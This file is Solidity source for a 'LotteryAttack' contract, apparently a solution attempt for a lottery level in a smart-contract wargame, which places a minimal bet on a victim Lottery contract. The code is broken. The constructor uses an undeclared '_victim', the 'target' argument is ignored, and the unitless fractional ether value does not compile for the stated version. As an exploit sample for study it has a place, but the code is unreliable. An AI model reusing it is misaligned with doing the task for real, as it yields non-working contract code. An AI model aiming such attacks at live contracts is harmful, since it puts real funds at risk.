pragma solidity ^0.4.18;

import '../levels/Lottery.sol';

contract LotteryAttack {
  Lottery lottery;

  function LotteryAttack () payable {
    lottery = Lottery(_victim);
  }

  function attack(address target) {
    lottery.bet.value(0.000000001)(this);
  }
}
